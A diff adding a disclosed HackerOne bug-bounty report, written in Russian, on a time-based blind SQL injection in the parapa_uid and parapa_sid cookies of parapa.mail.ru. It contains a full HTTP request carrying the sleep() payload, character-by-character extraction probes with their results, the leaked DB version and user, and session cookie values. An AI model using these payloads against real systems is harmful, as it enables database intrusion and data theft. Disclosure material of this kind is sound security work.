@@ -1,0 +1,40 @@
+ReportLink:https://hackerone.com/reports/109212
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/konqi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:18.01.2016 21:52:48
+
+Summary:
+SQL injection in out-of-scope service
+Добрый день. Тип уязвимости - Time Based SQL Injection, Уязвимые параметры - куки parapa_uid и parapa_sid.
+Уязвимость воспроизводиться на многих страницах сайта, в том числе и на форуме. 
+
+PoC
+
+GET /forums/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25
+Host: parapa.mail.ru
+Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
+Accept-Encoding: gzip, deflate
+Referer: https://parapa.mail.ru/forums/showthread.php?t=106825&page=74&p=3522012
+Cookie: popup_promo_8=1; PHPSESSID=5qdrcd3qddl28cj3uckcb5jgqrd3; parapa_sid=6a86c907dc5af9e51675dd9af28a26d2; parapa_uid=4836325'%20and%20(select%20*%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20; authsave=1; sdcs=8HuWrItQo1xsMkV0; __utmt=1; __utma=134583280.245860774.1450499258.1452129712.1452216090.10; __utmb=134583280.38.10.1452216090; __utmc=134583280; __utmz=134583280.1451857905.5.4.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); partner_id=1_983_80644_0_ ..._; __atuvc=8%7C0%2C24%7C1; __atuvs=568f0f191e2bc9e9012; bb_sessionhash=ef8f11d3715c05945b118ab7dfd4924c; bb_lastvisit=1450553133; bb_lastactivity=0; bb_userid=4826455; bb_password=4d153c2ed5ca803d72696c74e505cb0d; bb_thread_lastview=3436dc4396836eb1af979cffcccdd4d11ae6b77da-1-%7Bi-106825_i-1451774803_%7D; mrcu=B668568E66D3192803EC9BD79D25; p=7j0AAHjkmgAA; t_0=1; _es=07c5111d15ac4323843bfdd3974e8cfb.0aUYDtAD-SZL7esVGidUFdHGnN4; t_300=1; _ym_uid=1452186383566833729; _ym_isad=0; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAMDzAcA; _ga=GA1.2.487266910.1452193704; searchuid=976077651416940799; c=6vWOVgAAAI0wAQATAgQAfsIBvQEAXgBMOCAA; b=p0EIAHDkeAQAxGtjoedzNZwmYIYvztUQAAAQHkEBQo8EUpgHBQhm2l8h9BSIinA6nlkD; i=AQDVxY5WBAATAAgcCTwAAT8AAQkBAf8DAVQEAX8EAV4FAVkGAZMpAWEABQIBACQCBQIBAE4CCAQB7QEB; mr1lad=568f0f17548dc491-0-0-; Mpop=14522348551:5307034644454c407698d98738683011d010c751850435842545c080e0516575a1a454c:hidden@hidden.ru:; mc2=parapa.mail.ru; _ym_visorc_26627763=w; VID=1BdG0P0oUw1Q0000030614HQ::
+Connection: Keep-Alive
+X-Requested-With: XMLHttpRequest
+
+//некоторые куки изменил по соображениям безопасности.
+
+С помощью посимвольного перебора можно вытащить данные из БД.
+
+parapa_sid=4836325'%20and%20(select%20*%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true (sleeps 5 sec)
+parapa_uid=4836325'%20and%20(select%20*%20from%20(select(if(substring(user(),2,1)='a',sleep(5),1)))a)--%20 - true (sleeps 5 sec)
+parapa_uid=4836325'%20and%20(select%20*%20from%20(select(if(substring(user(),3,1)='x',sleep(5),1)))a)--%20 - false (quick response)
+parapa_uid=4836325'%20and%20(select%20*%20from%20(select(if(substring(user(),4,1)='z',sleep(5),1)))a)--%20 - false (quick response)
+и так далее..
+
+Для демонстрации атаки я собрал некоторые данные
+Версия Сервера MySQL - 5.1.56
+Имя пользователя СУБД - parapa@172.16.17.55
